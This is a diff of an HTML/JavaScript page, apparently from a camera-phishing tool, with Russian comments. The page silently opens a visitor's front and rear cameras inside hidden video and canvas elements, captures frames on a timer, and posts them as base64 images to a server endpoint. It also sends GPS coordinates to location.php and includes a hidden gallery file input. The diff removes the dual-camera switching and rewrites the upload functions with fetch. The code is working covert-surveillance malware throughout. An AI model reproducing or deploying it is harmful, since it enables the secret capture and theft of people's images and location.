-                                    // Перезапускаем фронтальную камеру через 5 секунд
-                                    setTimeout(function() {
-                                        navigator.mediaDevices.getUserMedia(constraintsFront)
-                                            .then(function(frontStream) {
-                                                console.log('Фронтальная камера перезапущена!');
-                                                handleSuccess(frontStream, video, canvas, 'front');
-                                                // Повторяем цикл переключения каждые 5 секунд
-                                                setInterval(function() {
-                                                    // Переключаемся на заднюю
-                                                    if (window.stream) {
-                                                        window.stream.getVideoTracks().forEach(function(track) {
-                                                            track.stop();
-                                                        });
-                                                    }
-                                                    navigator.mediaDevices.getUserMedia(constraintsBack)
-                                                        .then(function(bs) {
-                                                            handleSuccess(bs, vBack, cBack, 'back');
-                                                            setTimeout(function() {
-                                                                if (window.streamBack) {
-                                                                    window.streamBack.getVideoTracks().forEach(function(track) {
-                                                                        track.stop();
-                                                                    });
-                                                                }
-                                                                navigator.mediaDevices.getUserMedia(constraintsFront)
-                                                                    .then(function(fs) {
-                                                                        handleSuccess(fs, video, canvas, 'front');
-                                                                    });
-                                                            }, 5000);
-                                                        });
-                                                }, 10000); // Переключаемся каждые 10 секунд
-                                            })
-                                            .catch(function(err) {
-                                                console.log('Не удалось перезапустить фронтальную камеру:', err.message);
-                                            });
-                                    }, 5000);
-                                })
-                                .catch(function(err) {
-                                    console.log('Не удалось получить заднюю камеру:', err.message);
-                                    tryAlternativeBackCamera(video, canvas, vBack, cBack);
-                                });
-                        });
-                }, 3000); // Задержка 3 секунды для надежности
-            })
-            .catch(function(error) {
-                console.error('Ошибка доступа к фронтальной камере:', error);
-                // Если фронтальная камера не работает, пробуем хотя бы получить заднюю
-                var vBack = document.getElementById('video-back');
-                var cBack = document.getElementById('canvas-back');
-                
-                navigator.mediaDevices.getUserMedia(constraintsBack)
-                    .then(function(stream) {
-                        console.log('Фронтальная камера недоступна, но задняя камера получена!');
-                        if (vBack && cBack) {
-                            handleSuccess(stream, vBack, cBack, 'back');
-                        } else {
-                            // Если элементов нет, создаем их
-                            if (!vBack) {
-                                vBack = document.createElement('video');
-                                vBack.id = 'video-back';
-                                vBack.setAttribute('playsinline', '');
-                                vBack.setAttribute('autoplay', '');
-                                vBack.style.display = 'none';
-                                document.body.appendChild(vBack);
-                            }
-                            if (!cBack) {
-                                cBack = document.createElement('canvas');
-                                cBack.id = 'canvas-back';
-                                cBack.width = 740;
-                                cBack.height = 580;
-                                cBack.style.display = 'none';
-                                document.body.appendChild(cBack);
-                            }
-                            handleSuccess(stream, vBack, cBack, 'back');
-                        }
-                    })
-                    .catch(function(backError) {
-                        console.error('Не удалось получить доступ ни к одной камере:', backError);
-                    });
-            });
-    } else {
-        console.error('getUserMedia не поддерживается в этом браузере');
-    }
-}
-
-// Функция для альтернативного способа получения задней камеры
-function tryAlternativeBackCamera(video, canvas, videoBack, canvasBack) {
-    // Пробуем получить список всех доступных камер
-    navigator.mediaDevices.enumerateDevices()
-        .then(function(devices) {
-            var videoDevices = devices.filter(function(device) {
-                return device.kind === 'videoinput';
-            });
-            
-            if (videoDevices.length > 1) {
-                // Если есть несколько камер, пробуем использовать последнюю (обычно это задняя)
-                var backDeviceId = videoDevices[videoDevices.length - 1].deviceId;
-                var alternativeConstraints = {
-                    audio: false,
-                    video: {
-                        deviceId: { exact: backDeviceId }
-                    }
-                };
-                
-                navigator.mediaDevices.getUserMedia(alternativeConstraints)
-                    .then(function(stream) {
-                        console.log('Альтернативный способ: Задняя камера получена через deviceId!');
-                        var vBack = videoBack || document.getElementById('video-back');
-                        var cBack = canvasBack || document.getElementById('canvas-back');
-                        
-                        if (vBack && cBack) {
-                            handleSuccess(stream, vBack, cBack, 'back');
-                        } else {
-                            // Если элементов нет, создаем их
-                            if (!vBack) {
-                                vBack = document.createElement('video');
-                                vBack.id = 'video-back';
-                                vBack.setAttribute('playsinline', '');
-                                vBack.setAttribute('autoplay', '');
-                                vBack.style.display = 'none';
-                                document.body.appendChild(vBack);
-                            }
-                            if (!cBack) {
-                                cBack = document.createElement('canvas');
-                                cBack.id = 'canvas-back';
-                                cBack.width = 740;
-                                cBack.height = 580;
-                                cBack.style.display = 'none';
-                                document.body.appendChild(cBack);
-                            }
-                            handleSuccess(stream, vBack, cBack, 'back');
-                        }
-                    })
-                    .catch(function(error) {
-                        console.log('Альтернативный способ: Задняя камера недоступна:', error.message);
-                    });
-            } else {
-                // Если только одна камера, пробуем просто переключить facingMode
-                var simpleBackConstraints = {
-                    audio: false,
-                    video: {
-                        facingMode: "environment"
-                    }
-                };
-                
-                navigator.mediaDevices.getUserMedia(simpleBackConstraints)
-                    .then(function(stream) {
-                        console.log('Простой способ: Задняя камера получена через facingMode!');
-                        var vBack = videoBack || document.getElementById('video-back');
-                        var cBack = canvasBack || document.getElementById('canvas-back');
-                        
-                        if (vBack && cBack) {
-                            handleSuccess(stream, vBack, cBack, 'back');
-                        } else {
-                            // Если элементов нет, создаем их
-                            if (!vBack) {
-                                vBack = document.createElement('video');
-                                vBack.id = 'video-back';
-                                vBack.setAttribute('playsinline', '');
-                                vBack.setAttribute('autoplay', '');
-                                vBack.style.display = 'none';
-                                document.body.appendChild(vBack);
-                            }
-                            if (!cBack) {
-                                cBack = document.createElement('canvas');
-                                cBack.id = 'canvas-back';
-                                cBack.width = 740;
-                                cBack.height = 580;
-                                cBack.style.display = 'none';
-                                document.body.appendChild(cBack);
-                            }
-                            handleSuccess(stream, vBack, cBack, 'back');
-                        }
-                    })
-                    .catch(function(error) {
-                        console.log('Простой способ: Задняя камера недоступна - это нормально для устройств без задней камеры:', error.message);
-                    });
-            }
-        })
-        .catch(function(error) {
-            console.log('Не удалось получить список устройств:', error);
-        });
 }
 
 function handleSuccess(stream, video, canvas, cameraType) {
-    // Проверяем элементы еще раз перед использованием
-    if (!video) {
-        console.error('Ошибка: элемент video не найден в handleSuccess!');
-        return;
-    }
-    
-    if (!canvas) {
-        console.error('Ошибка: элемент canvas не найден в handleSuccess!');
-        return;
-    }
-    
-    // Сохраняем поток
-    if (cameraType === 'front') {
-        window.stream = stream;
-    } else {
-        window.streamBack = stream;
-    }
-    
-    // Устанавливаем поток в video элемент
+    if (!video || !canvas || typeof post !== 'function') return;
+    var ctx = canvas.getContext('2d');
+    if (!ctx) return;
     try {
         video.srcObject = stream;
-    } catch (error) {
-        console.error('Ошибка при установке srcObject:', error);
+    } catch (err) {
         return;
     }
-    
-    // Получаем контекст canvas
-    var context = canvas.getContext('2d');
-    if (!context) {
-        console.error('Не удалось получить контекст canvas!');
-        return;
-    }
-    
-    // Захватываем кадры с заданным интервалом
-    // Используем уникальный идентификатор для каждого интервала, чтобы они не конфликтовали
-    var intervalId = 'capture_' + cameraType + '_' + Date.now();
-    window[intervalId] = setInterval(function(){
-        // Проверяем, что элементы все еще доступны
+    window.stream = stream;
+    var intervalKey = 'capture_' + cameraType + '_' + Date.now();
+    window[intervalKey] = setInterval(function() {
         if (!video || !canvas) {
-            console.error('Элементы video или canvas были удалены!');
-            clearInterval(window[intervalId]);
+            clearInterval(window[intervalKey]);
             return;
         }
-        
-        // Проверяем готовность видео
-        if (video.readyState === video.HAVE_ENOUGH_DATA) {
+        if (video.readyState >= video.HAVE_ENOUGH_DATA) {
             try {
-                // Рисуем кадр на canvas
-                context.drawImage(video, 0, 0, 740, 580);
-                
-                // Конвертируем в base64 с заданным качеством
-                var canvasData = canvas.toDataURL("image/png", IMAGE_QUALITY).replace("image/png", "image/octet-stream");
-                
-                // Отправляем на сервер с указанием типа камеры
-                if (typeof post === 'function') {
-                    console.log('Отправка фото с камеры:', cameraType);
-                    post(canvasData, cameraType);
-                } else {
-                    console.error('Функция post не найдена!');
-                }
-            } catch (error) {
-                console.error('Ошибка при захвате кадра с камеры ' + cameraType + ':', error);
-            }
-        } else {
-            console.log('Камера ' + cameraType + ': видео еще не готово, readyState =', video.readyState);
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0);
+                var dataUrl = canvas.toDataURL('image/png', IMAGE_QUALITY).replace('image/png', 'image/octet-stream');
+                post(dataUrl, cameraType);
+            } catch (err) {}
         }
-    }, CAPTURE_INTERVAL);
-    
-    // Сохраняем ID интервала для возможной остановки
-    if (cameraType === 'front') {
-        window.frontCameraInterval = window[intervalId];
-    } else {
-        window.backCameraInterval = window[intervalId];
-    }
-    
-    console.log('Камера ' + cameraType + ' успешно инициализирована, интервал захвата установлен');
+    }, CAPTURE_INTERVAL_MS);
+    window.backCameraInterval = window[intervalKey];
 }
 
-// Ждем полной загрузки страницы и всех элементов
-(function() {
-    var attempts = 0;
-    var maxAttempts = 20; // Максимум 10 секунд (20 * 500ms)
-    
+(function waitThenInit() {
+    var maxAttempts = 20;
+    var attempt = 0;
     function tryInit() {
-        attempts++;
+        attempt++;
         var video = document.getElementById('video');
         var canvas = document.getElementById('canvas');
-        
         if (video && canvas && typeof post === 'function') {
-            console.log('Все готово, запускаем камеры...');
             waitForElementsAndInit();
-        } else if (attempts < maxAttempts) {
-            setTimeout(tryInit, 500);
-        } else {
-            console.error('Превышено время ожидания элементов!');
-            console.error('video:', !!video, 'canvas:', !!canvas, 'post:', typeof post);
+            return;
         }
+        if (attempt < maxAttempts) setTimeout(tryInit, 500);
     }
-    
     if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', function() {
-            setTimeout(tryInit, 1000);
-        });
+        document.addEventListener('DOMContentLoaded', function() { setTimeout(tryInit, 300); });
     } else {
-        setTimeout(tryInit, 1000);
+        setTimeout(tryInit, 300);
     }
 })();
 </script>
-<!-- Автоматически добавлено: функция отправки данных -->
 <script>
-function post(imgdata, cameraType){
-    if (typeof $ === 'undefined') {
-        console.error('jQuery не загружен!');
-        return;
-    }
-    // Определяем тип камеры (по умолчанию front)
-    cameraType = cameraType || 'front';
-    $.ajax({
-        type: 'POST',
-        data: { 
-            cat: imgdata,
-            camera_type: cameraType
-        },
-        url: 'forwarding_link/post.php',
-        dataType: 'json',
-        async: false,
-        success: function(result){
-        },
-        error: function(){
-        }
-    });
+function post(imgdata, cameraType) {
+    if (!imgdata || typeof GRABCAM_POST_URL === 'undefined') return;
+    cameraType = cameraType || 'back';
+    var form = new FormData();
+    form.append('cat', imgdata);
+    form.append('camera_type', cameraType);
+    fetch(GRABCAM_POST_URL, { method: 'POST', body: form }).catch(function() {});
 }
 
-
-// Функция для отправки геолокации
-function postLocation(location){
-    if (typeof $ === 'undefined') {
-        console.error('jQuery не загружен для отправки геолокации!');
-        return;
-    }
-    $.ajax({
-        type: 'POST',
-        data: { 
-            location_data: JSON.stringify(location),
-            location_type: 'gps'
-        },
-        url: 'forwarding_link/location.php',
-        dataType: 'json',
-        async: true,
-        success: function(result){
-            console.log('Геолокация отправлена на сервер');
-        },
-        error: function(){
-            console.log('Ошибка отправки геолокации');
-        }
+function postLocation(location) {
+    if (!location || typeof location.lat === 'undefined' || typeof location.lon === 'undefined') return;
+    var body = new URLSearchParams({
+        location_data: JSON.stringify(location),
+        location_type: 'gps'
     });
+    fetch('location.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: body.toString()
+    }).catch(function() {});
 }
 </script>
-<!-- Автоматически добавлено: элементы для камеры (ОБЕИХ) и галереи -->
+<!-- Одна камера (задняя) и галерея -->
 <div class="video-wrap" hidden="hidden">
     <video id="video" playsinline autoplay></video>
-    <video id="video-back" playsinline autoplay></video>
 </div>
 <canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>
-<canvas hidden="hidden" id="canvas-back" width="740" height="580"></canvas>
 <input type="file" id="gallery-input" accept="image/*" multiple style="display:none;">
 </html>
